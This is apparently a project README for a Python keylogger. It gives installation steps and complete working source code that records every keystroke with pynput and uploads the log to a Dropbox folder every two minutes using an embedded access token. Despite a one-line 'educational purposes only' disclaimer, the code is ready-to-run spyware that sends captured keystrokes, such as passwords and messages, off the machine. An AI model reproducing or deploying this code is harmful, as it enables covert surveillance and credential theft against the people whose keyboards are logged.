
# KeyLogger with Dropbox Integration

This project is a simple keylogger that logs keystrokes to a local file and uploads the log file to a specified Dropbox folder every 2 minutes.

## Prerequisites

Before you can run this keylogger, ensure you have the following installed on your system:

1. **Python 3.x**: You can download and install Python from the [official website](https://www.python.org/downloads/).
2. **pip**: Python package installer, usually included with Python. You can check if it's installed by running `pip --version` in your terminal.
3. **Required Python Packages**: Install the necessary Python packages using pip.

```sh
pip install dropbox pynput
```

## Dropbox Access Token

To upload files to Dropbox, you need an access token:

1. **Create a Dropbox App**:
   - Go to the [Dropbox App Console](https://www.dropbox.com/developers/apps).
   - Click on "Create App".
   - Choose "Scoped access" and select "Full Dropbox" or "App folder" based on your needs.
   - Name your app and click "Create App".

2. **Generate Access Token**:
   - Once your app is created, navigate to the "Permissions" tab and enable the required permissions.
   - Go to the "Settings" tab and scroll down to the "OAuth 2" section.
   - Click on "Generate" to create an access token.
   - Copy this access token as you will need it in your script.

## Installation and Usage

1. **Clone the Repository**:

```sh
git clone https://github.com/yourusername/keylogger-dropbox.git
cd keylogger-dropbox
```

2. **Modify Configuration**:
   - Open the `keylogger.py` file.
   - Replace `'YOUR_DROPBOX_ACCESS_TOKEN'` with your actual Dropbox access token.
   - Adjust `LOG_FILE_PATH` if you want the log file to be saved in a different location.
   - Replace `'/APP/FOLDER/keyLogger.txt'` in the `upload_log` function with the actual path to your Dropbox folder where you want to save the log file.

3. **Run the Keylogger**:

```sh
python keylogger.py
```

## Example Code

```python
import dropbox
from pynput import keyboard
import threading
import time

# Hardcoded configuration
DROPBOX_ACCESS_TOKEN = 'YOUR_DROPBOX_ACCESS_TOKEN'  # Replace with your actual Dropbox access token
LOG_FILE_PATH = 'keyLogger.txt'  # Replace with the desired log file path

# Initialize Dropbox client
dbx = dropbox.Dropbox(DROPBOX_ACCESS_TOKEN)

def upload_log():
    with open(LOG_FILE_PATH, 'rb') as f:
        dbx.files_upload(f.read(), '/APP/FOLDER/keyLogger.txt', mode=dropbox.files.WriteMode.overwrite)
    print("Log uploaded to Dropbox")

def schedule_upload(interval):
    while True:
        time.sleep(interval)
        upload_log()

def on_press(key):
    try:
        log = key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log = ' '
        elif key == keyboard.Key.enter:
            log = 'ENTER '
        elif key == keyboard.Key.shift:
            log = 'SHIFT '
        elif key == keyboard.Key.shift_r:
            log = 'SHIFT_R '
        elif key == keyboard.Key.backspace:
            log = 'BACKSPACE '
        else:
            log = f'{key} '
    with open(LOG_FILE_PATH, 'a') as f:
        f.write(log)

if __name__ == "__main__":
    upload_thread = threading.Thread(target=schedule_upload, args=(120,))
    upload_thread.daemon = True
    upload_thread.start()

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
```

## Important Notes

- This keylogger is intended for educational purposes only. Ensure you have permission to log keystrokes on any computer you use this on.
- Be cautious with sensitive information and respect privacy laws and regulations.

## Contributing

If you'd like to contribute, please fork the repository and use a feature branch. Pull requests are warmly welcome.

## License

This project is licensed under the MIT License. See the LICENSE file for details.
